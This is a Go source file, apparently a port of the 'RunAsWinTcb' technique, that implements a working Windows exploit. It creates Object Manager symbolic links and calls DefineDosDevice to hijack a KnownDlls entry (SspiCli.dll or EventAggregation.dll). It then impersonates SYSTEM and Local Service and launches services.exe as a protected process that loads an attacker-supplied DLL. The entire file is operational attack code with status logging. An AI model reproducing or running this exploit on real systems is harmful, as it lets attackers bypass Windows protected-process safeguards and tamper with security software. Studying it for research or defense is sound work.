package main

import (
	"errors"
	"fmt"
	"github.com/D00MFist/Go4aRun/pkg/winsys"
	"github.com/google/uuid"
	"golang.org/x/sys/windows"
	"os"
	"path/filepath"
	"syscall"
)

const (
	PPLBinary = "services.exe"

	DllToHijackWin8  = "SspiCli.dll"
	DllToHijackWin10 = "EventAggregation.dll"

	KnownDllObjDir = "\\GLOBAL??\\KnownDlls"

	FakeGlobalRootLinkName   = "\\??\\GLOBALROOT"
	FakeGlobalRootLinkTarget = "\\GLOBAL??"
)

func main() {
	if len(os.Args) < 2 {
		LogStatus("Path to exploit DLL is missing", nil, false)
		fmt.Println("Usage example: RunAsWinTcb.exe C:\\Users\\USER\\Desktop\\POC_DLL.dll")
		return
	}

	LogStatus("Checking if system is vulnerable.", nil, true)
	if !IsVulnerable() {
		LogStatus("System is not vulnerable.", nil, false)
		return
	}
	LogStatus("System is vulnerable", nil, true)

	LogStatus("Searching exploit DLL", nil, true)
	dllToLoadPath := os.Args[1]
	dllToLoadFullPath, _ := filepath.Abs(dllToLoadPath)
	if _, err := os.Stat(dllToLoadFullPath); errors.Is(err, os.ErrNotExist) {
		LogStatus("Exploit Dll could not be found", nil, false)
		os.Exit(0)
	}
	LogStatus(fmt.Sprintf("Using %s as an exploit DLL", dllToLoadFullPath), nil, true)

	LogStatus("Choosing DLL to hijack.", nil, true)
	dllToHijack := DllToHijack()
	LogStatus(fmt.Sprintf("Targeting %s", dllToHijack), nil, true)

	LogStatus("Starting DLL hijacking", nil, true)
	HijackDll(dllToHijack, dllToLoadFullPath)
}

func HijackDll(dllToHijack string, dllToLoadPath string) {
	var ErrAlreadyExists = "Cannot create a file when that file already exists."
	var err error

	var hSystemToken *syscall.Token

	//1
	LogStatus("Checking if current user is SYSTEM", nil, true)
	isUserSystem, err := IsCurrentUserSystem()
	if err != nil {
		LogStatus("Failed to check current user", err, false)
		return
	}
	if !isUserSystem {
		LogStatus("Current user is not SYSTEM", nil, true)
		LogStatus("Impersonating SYSTEM", nil, true)
		hSystemToken, err = ImpersonateSystem()
		if err != nil {
			LogStatus("Failed to impersonate SYSTEM", err, false)
			LogStatus("Make sure you are running as an administrator", nil, false)
			return
		}
	} else {
		LogStatus("Current user is SYSTEM", nil, true)
	}
	LogStatus("Creating \\KnownDlls directory in \\GLOBAL??", nil, true)
	_, err = ObjectManagerCreateDirectory(KnownDllObjDir)
	if err != nil {
		LogStatus("Failed to create \\KnownDlls directory in \\GLOBAL??", err, false)
		return
	}

	//2
	LogStatus("Creating dummy symbolic link in \\GLOBAL??\\KnownDlls\\", nil, true)
	dllLinkName := fmt.Sprintf("%s\\%s", KnownDllObjDir, dllToHijack)
	hDllLink, err := ObjectManagerCreateSymlink(dllLinkName, "foo123")
	if err != nil {
		LogStatus("Failed to create dummy symbolic link in \\GLOBAL??\\KnownDlls\\", err, false)
		return
	}

	if isUserSystem {
		//ACL modification is done to make symbolic link, created by SYSTEM, accessible to Local Service
		LogStatus(fmt.Sprintf("Modifying ACL of %s", dllLinkName), nil, true)
		LogStatus("Initializing a new Security Descriptor", nil, true)
		newSid, _ := windows.NewSecurityDescriptor()
		if err != nil {
			LogStatus("Failed to initialize a new Security Descriptor", err, false)
			return
		}

		err = newSid.SetDACL(nil, true, false)
		if err != nil {
			LogStatus("Failed to initialize a new Security Descriptor", err, false)
			return
		}

		LogStatus(fmt.Sprintf("Setting a new Security Descriptor to %s", dllLinkName), nil, true)
		err = windows.SetKernelObjectSecurity(windows.Handle(*hDllLink), windows.DACL_SECURITY_INFORMATION, newSid)
		if err != nil {
			LogStatus(fmt.Sprintf("Failed to set a new Security Descriptor to %s", dllLinkName), err, false)
			return
		}

		LogStatus("Impersonating Local Service", nil, true)
		_, err = ImpersonateLocalService()
		if err != nil {
			LogStatus("Failed to impersonate Local Service", err, false)
			return
		}
	} else {
		LogStatus("Dropping SYSTEM privileges", nil, true)
		err = windows.RevertToSelf()
		if err != nil {
			LogStatus("Failed to drop SYSTEM privileges", err, false)
			return
		}
	}

	LogStatus(fmt.Sprintf("Creating a symbolic link %s with a target path of %s ", FakeGlobalRootLinkName, FakeGlobalRootLinkTarget), nil, true)
	_, err = ObjectManagerCreateSymlink(FakeGlobalRootLinkName, FakeGlobalRootLinkTarget)
	if err != nil {
		LogStatus(fmt.Sprintf("Failed to create a symbolic link %s with a target path of %s ", FakeGlobalRootLinkName, FakeGlobalRootLinkTarget), err, false)
		return
	}
	//4
	dosDeviceName := fmt.Sprintf("GLOBALROOT\\KnownDlls\\%s", dllToHijack)
	dosDeviceTargetPath := fmt.Sprintf("\\KernelObjects\\%s", dllToHijack)
	dosDeviceNameUTF, _ := windows.UTF16PtrFromString(dosDeviceName)
	dosDeviceTargetPathUTF, _ := windows.UTF16PtrFromString(dosDeviceTargetPath)
	LogStatus("Calling DefineDosDevices", nil, true)
	err = windows.DefineDosDevice(windows.DDD_NO_BROADCAST_SYSTEM|windows.DDD_RAW_TARGET_PATH, dosDeviceNameUTF, dosDeviceTargetPathUTF)
	if err != nil && err.Error() != ErrAlreadyExists {
		LogStatus("Failed to call DefineDosDevices", err, false)
		return
	}

	if isUserSystem {
		LogStatus("Reverting back to SYSTEM", nil, true)
		err = windows.RevertToSelf()
		if err != nil {
			LogStatus("Failed to revert back to SYSTEM", err, false)
			return
		}
	} else {
		LogStatus("Impersonating SYSTEM", nil, true)
		err = Impersonate(*hSystemToken)
		if err != nil {
			LogStatus("Failed to impersonate SYSTEM", err, false)
			return
		}
	}
	//5
	LogStatus(fmt.Sprintf("Mapping the DLL in %s", dosDeviceTargetPath), nil, true)
	_, err = MapDll(dosDeviceTargetPath, dllToLoadPath)
	if err != nil {
		LogStatus(fmt.Sprintf("Failed to map the DLL in %s", dosDeviceTargetPath), err, false)
		return
	}

	randomUUID := uuid.New().String()
	eventName := fmt.Sprintf("Global\\%s_DLL_LOADED", randomUUID)
	LogStatus("Creating an event to monitor DLL loading", nil, true)
	hDllLoadEvent, err := windows.CreateEvent(nil, 0, 0, windows.StringToUTF16Ptr(eventName))
	if err != nil {
		LogStatus("Failed to create an event", err, false)
		return
	}
	//6
	cmdLine := CreateCommandLine(randomUUID)

	var currThreadToken windows.Token
	LogStatus("Getting a SYSTEM token", nil, true)
	if isUserSystem {
		err = windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ADJUST_PRIVILEGES, &currThreadToken)
		if err != nil {
			LogStatus("Failed to get a SYSTEM token", err, false)
			return
		}
	} else {
		err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ADJUST_PRIVILEGES, false, &currThreadToken)
		if err != nil {
			LogStatus("Failed to get a SYSTEM token", err, false)
			return
		}
	}

	LogStatus("Enabling SE_ASSIGNPRIMARYTOKEN privilege", nil, true)
	if !TokenCheckPrivilege(syscall.Token(currThreadToken), winsys.SE_ASSIGNPRIMARYTOKEN_NAME, true) {
		LogStatus("Failed to enable SE_ASSIGNPRIMARYTOKEN privilege", nil, false)
		return
	}

	var hDuplicateToken windows.Token
	err = windows.DuplicateTokenEx(currThreadToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityAnonymous, windows.TokenPrimary, &hDuplicateToken)
	if err != nil {
		LogStatus("Failed to get a SYSTEM token", err, false)
		return
	}

	LogStatus("Starting services.exe as a Protected Process", nil, true)
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	err = windows.CreateProcessAsUser(hDuplicateToken, nil, windows.StringToUTF16Ptr(cmdLine), nil,
		nil, true, windows.CREATE_PROTECTED_PROCESS, nil, nil, &sI, &pI)
	if err != nil {
		LogStatus("Failed to start services.exe as a Protected Process", err, false)
		return
	}

	_, err = windows.WaitForSingleObject(pI.Process, windows.INFINITE)
	if err != nil {
		LogStatus("Failed to start services.exe as a Protected Process", err, false)
		return
	}

	LogStatus("Waiting for DLL to signal back", nil, true)
	dllLoadSuccessTimer, err := windows.WaitForSingleObject(hDllLoadEvent, 100)
	dllLoadSuccess := dllLoadSuccessTimer == windows.WAIT_OBJECT_0
	if !dllLoadSuccess {
		LogStatus("DLL was not loaded", nil, false)
		return
	}
	LogStatus("DLL loaded successfully", nil, true)
}
